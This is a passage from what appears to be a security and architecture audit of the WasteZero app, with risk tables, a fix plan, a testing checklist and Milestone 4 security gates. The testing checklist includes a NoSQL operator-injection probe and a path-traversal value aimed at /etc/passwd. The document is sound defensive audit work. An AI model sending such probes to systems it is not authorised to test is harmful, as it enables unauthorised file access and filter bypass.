| SEC-026 | INFO | Frontend/Guard | app.routes.ts | N/A | `adminGuard` defined but not used in any route | Apply to Milestone 4 admin routes |
| SEC-027 | INFO | Backend/Docs | crypto.js | N/A | System labelled as encrypted but not E2E | Update documentation to "Encryption at Rest" |

---

## 43. General Architecture Problems

| ID | Severity | Component | Problem | Why It Matters | Recommended Solution |
|---|---|---|---|---|---|
| ARCH-001 | HIGH | Backend/Logging | No structured logging (console.log/error only) | Cannot search/alert in production; risk of sensitive data in logs | Integrate Winston or Pino with log levels; never log full error objects |
| ARCH-002 | HIGH | Backend/Search | Search and filter APIs return unbounded results | Memory exhaustion DoS; poor UX | Add `.limit(50)` and pagination to all list endpoints |
| ARCH-003 | HIGH | Backend/JWT | No token invalidation mechanism | Compromised/stolen tokens valid for 7 days | Implement token blacklist (Redis) or reduce expiry to 24h |
| ARCH-004 | MEDIUM | Backend/Rate | In-memory rate limiting | Bypassed by horizontal scaling; resets on restart | Migrate to Redis-backed rate limiter |
| ARCH-005 | MEDIUM | Backend/Validation | `wasteTypes` on pickups/users has no enum allowlist | Analytics pollution; unexpected values in DB | Define and enforce `ALLOWED_WASTE_TYPES` constant; validate in schema and validator |
| ARCH-006 | MEDIUM | Backend/Email | Transient SMTP errors cause registration failure | Poor UX; users lose registration flow | Add OTP email retry logic with exponential backoff |
| ARCH-007 | MEDIUM | Backend/Testing | Zero automated tests in the codebase | Regressions undetected; security fixes untested | Add Jest unit tests for service layer; Supertest for API integration |
| ARCH-008 | MEDIUM | Backend/Config | No startup validation of required env vars | Silent failures with undefined values | Add env validation middleware (e.g., envalid or custom) that exits on missing keys |
| ARCH-009 | MEDIUM | Frontend/Env | Only one `environment.ts` file | Production build uses dev config (localhost:5001) | Create `environment.prod.ts` with production URLs |
| ARCH-010 | MEDIUM | Backend/Async | Service errors silently swallowed in matching | Matching failures never surface to users | Log warning + emit admin alert for persistent matching failures |
| ARCH-011 | LOW | Backend/Code | `sendError` includes `error.message` in some responses | Internal error details exposed in non-prod environments | Sanitize error messages before passing to `sendError` |
| ARCH-012 | LOW | Backend/Cleanup | Notification cleanup runs in `listForUser` (per-request) | Per-request cleanup = inconsistent timing, extra DB writes | Move cleanup entirely to server-interval job (already exists) |
| ARCH-013 | LOW | Backend/Design | Admin pickup management (GET /api/pickups) returns all records | Pagination exists but no filtering by city or date range | Add query filters to admin pickup list |
| ARCH-014 | LOW | Frontend/Socket | Socket disconnects on logout but not on token expiry | User with expired token stays connected until manual logout | Add token expiry check in socket service; auto-disconnect on JWT error events |
| ARCH-015 | INFO | Backend/API | Route naming inconsistency (some plural, some singular) | `match.routes.js` mounts at `/api/matches` but only has one endpoint | Standardize REST naming conventions |

---

## 44. Milestone 4 Risk Table

| Feature | Current State | Future Risk | Severity | Preventive Design |
|---|---|---|---|---|
| Admin Dashboard | Not implemented | Collection-scan aggregations without indexes; no rate limit | HIGH | Create indexes before endpoints; add `adminLimiter`; add `$limit` to all pipelines |
| User Suspension | `isSuspended` not in User model | Suspended users bypass suspension via existing JWTs | HIGH | Add field + check in `protect` middleware + login; consider token blacklist |
| Opportunity Removal | Hard-delete (no soft-delete) | Permanent data loss; cascade-kills applications; no audit trail | HIGH | Implement soft-delete fields before M4 endpoint; write AdminLog |
| Admin Logs | No model/collection | Admin actions permanently unauditable; disputes unresolvable | HIGH | Implement AdminLog schema as first M4 task; make append-only |
| Statistics APIs | Not implemented | Expensive aggregations; no rate limit; potential ReDoS via unindexed regex | HIGH | Plan indexes before coding; add compound indexes; add generalLimiter |
| Reports (general) | Not implemented | No authorization check = any user downloads reports | HIGH | MUST use `authorize('admin')` + `protect` middleware on all report routes |
| CSV Reports | Not implemented | CSV injection via user-controlled fields | HIGH | Sanitize all string fields before CSV encoding |
| Excel Reports | Not implemented | OOM on large datasets without streaming | HIGH | Use ExcelJS streaming API; max row hard limit (e.g., 10,000) |
| PDF Reports | Not implemented | SSRF if Puppeteer used; HTML injection | CRITICAL | Use PDFKit (code-only PDF generation); never render user content as HTML |
| AdminLog Access | Not planned | Admins can read their own audit trail and potentially delete incriminating entries | MEDIUM | Implement read-only API for AdminLogs; no DELETE/UPDATE endpoints; separate monitoring role |

---

## 45. Security Testing Plan

### Authentication
- [ ] Register with role "admin" (should fail if admin exists; **currently succeeds on fresh deploy**)
- [ ] Login with suspended user (M4: should return 403 with reason)
- [ ] Login with unverified email (should return 403)
- [ ] Submit expired OTP (should return 400)
- [ ] Submit OTP 6 times (5th wrong + 1 = should lock and delete OTP)
- [ ] Reuse OTP after successful verification (should return "OTP not found")
- [ ] Submit malformed JWT (should return 401 Invalid token)
- [ ] Submit expired JWT (should return 401 Token has expired)
- [ ] Remove JWT and call protected endpoint (should return 401)
- [ ] Call login 25 times in 15 minutes (should return 429 after 20)

### Authorization
- [ ] Volunteer calls `DELETE /api/opportunities/:id` (should return 403)
- [ ] Volunteer calls `GET /api/pickups` [admin route] (should return 403)
- [ ] NGO calls `POST /api/pickups` [volunteer-only] (should return 403)
- [ ] NGO calls `GET /api/applications/my-applications` [volunteer-only] (should return 403)
- [ ] Volunteer calls `GET /api/applications` [ngo/admin] (should return 403)
- [ ] User A (volunteer) calls `PUT /api/pickups/:id_of_user_B` (should return 403)
- [ ] NGO A calls `PUT /api/opportunities/:id_of_ngo_B` (should return 403)
- [ ] Volunteer sends `role: "admin"` in profile update body (should be ignored)

### API
- [ ] Send `?status[$ne]=open` to filter endpoint (should ignore/fail-safe)
- [ ] Send `GET /api/opportunities/search?q=` (no q value — should return 400)
- [ ] Send `GET /api/opportunities/search?q=a` (large result set — check limit)
- [ ] Send `GET /api/pickups/my-pickups?limit=99999` (should be capped at 100)
- [ ] Send malformed ObjectId to `GET /api/opportunities/:id` (should return 400)
- [ ] Send `opportunity_id: "../../../../etc/passwd"` to applications (should fail ObjectId validation)

### Socket.IO
- [ ] Connect without token (should return "Access denied. No token provided.")
- [ ] Connect with expired JWT (should return "Token has expired.")
- [ ] Send `message:send` with `senderId` in payload (server must ignore client-supplied senderId)
- [ ] Send `message:send` with `receiverId` of same user (role check should block volunteer-to-volunteer)
- [ ] Send `message:read` with conversationId not including own userId (should return error)
- [ ] Send 25 messages in 10 seconds (should be rate-limited after 20)

### Reports (Milestone 4 — preventive testing)
- [ ] Volunteer calls `GET /api/reports/users` (should return 403)
- [ ] NGO calls `GET /api/reports/users` (should return 403)
- [ ] Admin calls `GET /api/reports/users?limit=999999` (should be capped)
- [ ] Admin calls `GET /api/reports/users?format=exe` (should return 400)
- [ ] Verify CSV download does not execute formulas when opened in Excel
- [ ] Verify PDF generation does not fetch external URLs

---

## 46. Priority Fix Plan

### Phase 1 — MUST FIX BEFORE DEMO (Critical/High)

1. **SEC-001** — Remove `'admin'` from public `allowedRoles` in `registerUser`. Create a separate admin initialization endpoint or seed admin from environment variables.
2. **SEC-002** — Add `.limit(50)` to `searchOpportunities()` and `filterOpportunities()` in opportunity.service.js.
3. **SEC-003** — Add `{ $limit: 50 }` to the `listConversationsForUser` aggregation pipeline.
4. **SEC-024** — Add pagination to `getMyApplications` in application.controllers.js.
5. **ARCH-007** — Add at minimum a few Supertest integration tests for RBAC and ownership middleware.
6. **ARCH-002** (partial) — Add `generalLimiter` to search and filter endpoints.

### Phase 2 — MUST FIX BEFORE MILESTONE 4 SUBMISSION

7. **SEC-004** — Add `isSuspended` to User schema + check in `protect` middleware + login controller.
8. **SEC-013** — Change admin opportunity delete to soft-delete before implementing M4 admin panel.
9. **SEC-009** — Add rate limiting to conversations, notifications, search endpoints.
10. **SEC-016** — Add JWT_SECRET minimum length validation on startup.
11. **ARCH-001** — Install Winston; replace `console.error` in controllers.
12. **ARCH-009** — Create `environment.prod.ts` for Angular.
13. **ARCH-008** — Add environment variable validation on startup.
14. **SEC-017** — Define `ALLOWED_WASTE_TYPES` allowlist; enforce in validation.

### Phase 3 — HARDENING (Before Production)

15. **SEC-008** — Migrate rate limiters to Redis store.
16. **SEC-005** — Add `passwordChangedAt` to User; invalidate JWTs issued before password change.
17. **SEC-007** — Evaluate HttpOnly cookie migration for JWT storage.
18. **SEC-015** — Remove query param token fallback from socket.middleware.js.
19. **SEC-022** — Move `socket.io-client` from production dependencies to devDependencies.
20. **ARCH-003** — Implement token blacklist (Redis) or reduce JWT expiry to 1–2 days.

---

## 47. Recommended Security Architecture (Milestone 4 Ready)

```
                          ┌─────────────────────────────┐
                          │  Startup Validation Layer    │
                          │  • Verify JWT_SECRET length  │
                          │  • Verify CHAT_ENCRYPTION_KEY│
                          │  • Verify MONGO_URI format   │
                          │  • Verify CLIENT_URL format  │
                          └─────────────┬───────────────┘
                                        │
Browser ──► Angular SPA ──► HTTP Request │
                                        ▼
                          ┌─────────────────────────────┐
                          │   Express Middleware Chain   │
                          │  1. Helmet (security headers)│
                          │  2. CORS (CLIENT_URL only)   │
                          │  3. Rate Limiter (Redis-backed│
                          │  4. protect (JWT + DB lookup)│
                          │     ├── isSuspended check   │
                          │     └── passwordChangedAt   │
                          │  5. authorize(roles)         │
                          │  6. express-validator        │
                          │  7. ownership middleware     │
                          └─────────────┬───────────────┘
                                        │
                          ┌─────────────▼───────────────┐
                          │        Controller            │
                          │  ├── Try/catch + sendError   │
                          │  └── Delegates to service    │
                          └─────────────┬───────────────┘
                                        │
                          ┌─────────────▼───────────────┐
                          │         Service              │
                          │  ├── Field whitelisting      │
                          │  ├── Paginated queries       │
                          │  ├── AES-256-GCM encryption  │
                          │  └── audit.service.logAction │
                          └─────────────┬───────────────┘
                                        │
                          ┌─────────────▼───────────────┐
                          │    MongoDB + Mongoose        │
                          │  ├── Schema validation       │
                          │  ├── Compound indexes        │
                          │  └── TTL indexes             │
                          └─────────────────────────────┘
```

---

## 48. Final Security Checklist

### Implemented ✅

- [x] JWT authentication with DB user lookup
- [x] bcrypt password hashing (salt=10)
- [x] bcrypt OTP hashing
- [x] OTP brute-force lockout (5 attempts)
- [x] OTP TTL expiry + replay prevention
- [x] Email verification gate before login
- [x] Generic error messages (prevents enumeration)
- [x] RBAC via `protect` + `authorize()` middleware
- [x] Object-level ownership middleware for opportunities, pickups, applications
- [x] ObjectId validation guards (prevents CastError DoS)
- [x] Mass assignment prevention (explicit field whitelisting)
- [x] ReDoS prevention (regex escaping with escapeRegex)
- [x] Pagination with max limit=100 on paginated endpoints
- [x] AES-256-GCM encryption for messages and notifications
- [x] MIME type validation on file uploads
- [x] File size limit on uploads (5MB)
- [x] Cloudinary CDN for file hosting (no server-side storage)
- [x] URL injection prevention (delete req.body.image on no-file requests)
- [x] Socket.IO authentication middleware (JWT + DB lookup)
- [x] Socket message rate limiting (20/10s)
- [x] Socket sender identity from server (not client-supplied)
- [x] Conversation participation validation in socket events
- [x] Helmet HTTP security headers
- [x] CORS allowlist (CLIENT_URL env var; fail-closed)
- [x] Rate limiting on login, OTP, profile updates
- [x] Sort field whitelist in queryBuilder
- [x] Pagination cap (max 100)
- [x] Global error handler with production safety
- [x] Stack traces hidden in production
- [x] `.env` excluded from git; `.env.example` with placeholders
- [x] CHAT_ENCRYPTION_KEY startup validation (fail-fast)
- [x] Atomic pickup status transitions (optimistic concurrency)
- [x] Unique compound index on applications (prevents duplicate apply)

### Not Implemented / Needs Fix ⚠️

- [ ] Admin self-registration restricted
- [ ] JWT_SECRET startup validation
- [ ] Suspension check in protect middleware and login
- [ ] Soft-delete for opportunities (admin moderation)
- [ ] AdminLog model and audit trail
- [ ] Rate limiting on search, filter, conversations, notifications
- [ ] Limit on search/filter results
- [ ] Token revocation (blacklist or short expiry)
- [ ] Structured logging (Winston/Pino)
- [ ] Redis-backed rate limiters
- [ ] Automated test suite
- [ ] wasteTypes enum allowlist
- [ ] CSP header on Angular frontend
- [ ] Environment variable format validation

---

## Final Security Scores

| Category | Score | Reasoning |
|---|---|---|
| Authentication | 7/10 | OTP flow, bcrypt, email verification are strong. Admin self-registration and no suspension check are gaps. |
| Authorization/RBAC | 7.5/10 | Ownership middleware is well-implemented across all resources. Admin-can-modify-any-application is ambiguous. |
| API Security | 6/10 | IDOR protections are good. Missing rate limits and unbounded queries are significant API-level risks. |
| Frontend Security | 5/10 | JWT in localStorage is standard but risky. No CSP. Guards rely on localStorage state. |
| Socket Security | 7.5/10 | Auth middleware, sender enforcement, rate limiting are all present. Query param token is minor issue. |
| Database Security | 6.5/10 | Good indexes, proper projections, no injection. Unbounded queries and in-memory-only rate limits are gaps. |
| Data Protection | 8/10 | AES-256-GCM encryption is correctly implemented. No plaintext storage. IV/authTag stripped from responses. |
| Admin Security | 4/10 | Admin self-registration is HIGH risk. No audit trail. Soft-delete not implemented. M4 admin controls not yet built. |
| Reporting Security | N/A | Not yet implemented. Risk analysis documented above. |
| Input Validation | 7/10 | express-validator used throughout. Missing: search length limits, wasteTypes allowlist, filter status validation. |
| Error Handling | 7.5/10 | Global handler, production safety, Mongoose error normalization. Console.error in controllers is minor gap. |
| **Overall Security** | **6.3/10** | Above-average for academic milestone project. Core security patterns are sound. Several HIGH issues must be fixed before adding admin features. |

---

## Top 10: What a Senior Engineer Would Reject This For

1. **Admin self-registration via public API** — Any attacker on a fresh deployment becomes admin.
2. **Unbounded database queries in search and filter** — Production-scale DoS via legitimate API endpoint.
3. **No token revocation** — Compromised/stolen 7-day JWTs cannot be invalidated.
4. **No audit trail for admin actions** — Admin can delete, modify, and override with zero accountability.
5. **In-memory rate limiters not safe for production** — Bypass via distributed requests; reset on server restart.
6. **Hard-delete of opportunities without soft-delete** — Irreversible data loss by any admin action.
7. **JWT_SECRET has no startup validation** — A weak or missing secret would be silent until a crypto failure.
8. **No automated tests** — Security middleware correctness relies entirely on manual testing.
9. **No structured logging** — Cannot debug production incidents; potential sensitive data in logs.
10. **isSuspended field not in User model yet, but suspension is planned for M4** — Adding M4 features without the core field creates a window where suspended users bypass the feature.

---

## Top 10: Must Fix Before Milestone 4 Submission

1. **Remove `'admin'` from `allowedRoles` in public registration** — file: auth.controllers.js line 22.
2. **Add `isSuspended` + `suspensionReason` to User model** — prerequisite for all M4 suspension features.
3. **Add suspension check in `protect` middleware** — file: auth.middleware.js after `User.findById`.
4. **Add suspension check in `loginUser`** — file: auth.controllers.js before token generation.
5. **Change admin opportunity delete to soft-delete** — add `isRemovedByAdmin`, `removedAt`, `removedBy`, `removalReason` fields to opportunity.model.js.
6. **Add `.limit()` to searchOpportunities and filterOpportunities** — file: opportunity.service.js lines 156 and 183.
7. **Create `AdminLog` schema** — must exist before ANY M4 admin write endpoint goes live.
8. **Add rate limiting to search, filter, conversations, notifications** — file: relevant route files.
9. **Add `authorize('admin')` + `protect` to ALL M4 report endpoints** — no exceptions.
10. **Add CSV injection sanitization** — before the first CSV is exportable from any M4 endpoint.

---

## WasteZero Milestone 4 Security Gate

> This section defines mandatory security controls that must be in place **before** each Milestone 4 feature is activated. Controls are assigned to Developer A (Administration/Security) or Developer B (Analytics/Reports).

---

### Gate 1 — Before ANY Admin Endpoint Goes Live

| Control | Developer | File | Status |
|---|---|---|---|
| Remove `'admin'` from public register `allowedRoles` | **Dev A** | auth.controllers.js | ❌ Not done |
| Add `isSuspended`, `suspensionReason`, `suspendedAt`, `suspendedBy` to User schema | **Dev A** | users.model.js | ❌ Not done |
| Add `isSuspended` check in `protect` middleware | **Dev A** | auth.middleware.js | ❌ Not done |
| Add `isSuspended` check in `loginUser` controller | **Dev A** | auth.controllers.js | ❌ Not done |
| Create `AdminLog` model with all required fields | **Dev A** | models/admin-log.model.js | ❌ Not done |
| Create `audit.service.js` with `logAction()` that writes to AdminLog collection | **Dev A** | services/audit.service.js | ❌ Not done |
| Apply `protect` + `authorize('admin')` to ALL admin routes | **Dev A** | routes/admin.routes.js | ❌ Not done |

### Gate 2 — Before Opportunity Moderation (Admin Remove)

| Control | Developer | File | Status |
|---|---|---|---|
| Add `isRemovedByAdmin`, `removedAt`, `removedBy`, `removalReason` to Opportunity schema | **Dev A** | opportunity.model.js | ❌ Not done |
| Update `getAllOpportunities`, `getOpportunityById`, `filterOpportunities`, `searchOpportunities` to exclude `isRemovedByAdmin: true` | **Dev A** | opportunity.service.js | ❌ Not done |
| Admin remove endpoint writes to `AdminLog` | **Dev A** | admin.controller.js | ❌ Not done |
| Update `applyForOpportunity` to reject removed opportunities | **Dev A** | application.controllers.js | ❌ Not done |

### Gate 3 — Before Statistics / Dashboard Endpoints

| Control | Developer | File | Status |
|---|---|---|---|
| Create MongoDB compound indexes required for all aggregation pipelines | **Dev B** | models/*.js | ❌ Not done |
| Add `{ $limit: N }` to all aggregation pipelines | **Dev B** | services/analytics.service.js | ❌ Not done |
| Add `adminLimiter` (5 requests/min) to all admin analytics endpoints | **Dev B** | routes/dashboard.routes.js | ❌ Not done |
| Add limit to `searchOpportunities` and `filterOpportunities` | **Dev B** | opportunity.service.js | ❌ Not done |

### Gate 4 — Before Report Download Endpoints

| Control | Developer | File | Status |
|---|---|---|---|
| `protect` + `authorize('admin')` on ALL report routes | **Dev B** | routes/report.routes.js | ❌ Not done |
| `reportRateLimiter` — max 5 report downloads per hour per admin | **Dev B** | middlewares/rateLimiter.middleware.js | ❌ Not done |
| Streaming CSV export (Mongoose cursor → Transform stream → res.pipe) — no in-memory array | **Dev B** | utils/csvExporter.js | ❌ Not done |
| Streaming Excel export (ExcelJS WorkbookWriter streaming API) | **Dev B** | utils/excelExporter.js | ❌ Not done |
| CSV injection sanitization: prefix cell values starting with =, +, -, @ with tab | **Dev B** | utils/csvExporter.js | ❌ Not done |
| PDF generation uses PDFKit (no Puppeteer, no HTML rendering of user content) | **Dev B** | utils/pdfExporter.js | ❌ Not done |
| Report generation writes to AdminLog (action: REPORT_DOWNLOADED) | **Dev B** | admin.controller.js | ❌ Not done |
| Maximum row limits enforced (e.g., 10,000 rows per report) | **Dev B** | services/report.service.js | ❌ Not done |

### Gate 5 — Before Admin Log Endpoints

| Control | Developer | File | Status |
|---|---|---|---|
| AdminLog collection is append-only (no DELETE, no UPDATE routes) | **Dev A** | routes/audit.routes.js | ❌ Not done |
| AdminLog endpoints require `protect` + `authorize('admin')` | **Dev A** | routes/audit.routes.js | ❌ Not done |
| AdminLog fetching is paginated (max 100 per request) | **Dev A** | controllers/audit.controller.js | ❌ Not done |
| AdminLog query filtered by `admin_id`, `action`, date range — no unfiltered full collection scans | **Dev A** | services/audit.service.js | ❌ Not done |

---

*End of WasteZero Security & Architecture Audit.*
